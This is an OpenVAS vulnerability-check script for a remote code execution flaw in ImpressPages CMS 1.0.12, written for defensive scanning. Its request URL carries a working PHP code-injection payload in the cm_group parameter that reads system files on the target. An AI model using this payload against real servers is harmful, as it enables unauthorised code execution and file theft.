###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_ImpressPages_49798.nasl 12 2013-10-27 11:15:33Z jan $
#
# ImpressPages CMS 'actions.php' Remote Code Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "ImpressPages CMS is prone to a remote-code execution vulnerability.

Exploiting this issue will allow attackers to execute arbitrary code
within the context of the affected application.

ImpressPages CMS 1.0.12 is vulnerable; other versions may also
be affected.";

tag_solution = "Vendor updates are available. Please see the references for more
information.";

if (description)
{
 script_id(103378);
 script_bugtraq_id(49798);
 script_version ("$Revision: 12 $");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

 script_name("ImpressPages CMS 'actions.php' Remote Code Execution Vulnerability");

desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/49798");
 script_xref(name : "URL" , value : "http://www.impresspages.org/");
 script_xref(name : "URL" , value : "http://www.impresspages.org/news/impresspages-1-0-13-security-release/");
 script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/521118");

 script_tag(name:"risk_factor", value:"High");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2012-01-06 10:27:46 +0100 (Fri, 06 Jan 2012)");
 script_description(desc);
 script_summary("Determine if ImpressPages CMS is prone to a remote-code execution vulnerability");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

if(!can_host_php(port:port))exit(0);

dirs = make_list("/impress","/impresspages","/imprescms","/cms",cgi_dirs());
files = traversal_files();

foreach dir (dirs) {
   
  url = string(dir, "/"); 

  if(http_vuln_check(port:port, url:url,pattern:"Powered by.*ImpressPages")) {

    foreach file (keys(files)) {

      url = string(dir, "/?cm_group=text_photos\\title\\Module();echo%20file_get_contents(%27/",files[file],"%27);echo&cm_name=openvas");

      if(http_vuln_check(port:port, url:url,pattern:file)) {

          security_hole(port:port);
	  exit(0);

      }  
    }  

  }
}

exit(0);

